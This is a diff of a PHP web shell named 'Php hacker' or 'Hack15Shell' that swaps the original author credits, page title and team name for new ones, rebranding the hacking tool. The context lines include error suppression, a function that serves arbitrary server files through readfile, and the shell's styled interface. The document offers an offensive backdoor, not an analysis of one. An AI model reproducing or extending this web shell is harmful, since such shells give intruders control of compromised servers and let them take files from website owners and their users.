@@ -1,7 +1,7 @@
 <?
 /*########################################### 
 Script Name : Php hacker v1.0
-Coded By GeNiUs HaCkEr						  
+Written By Hussien Yousef					  
 ###########################################*/
 error_reporting(0); 
 set_magic_quotes_runtime(0);
@@ -45,7 +45,7 @@ function download($dwfile) {$size = filesize($dwfile);
 @readfile($dwfile); exit;}
 ?>
 <html> 
-<head><title>Hack15Shell</title></head>
+<head><title>PHPHacker Shell</title></head>
 <style> 
 BODY { SCROLLBAR-BASE-COLOR: #191919; SCROLLBAR-ARROW-COLOR: #008080; } 
 a{color:#dadada;text-decoration:none;font-family:tahoma;font-size:13px}
@@ -316,6 +316,6 @@ print "</td></tr></table>";
 ?><?
 print "<br><table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>"; 
 print"<tr><td><font size=2 face=tahoma>"; 
-print"<center>Coded By GeNiUs HaCkEr <br>[ Team Hack15 ]"; 
+print"<center>Coded By alph4w0lf <br>[ Team 00 ]"; 
 print"</font></td></tr></table>";
 ?>
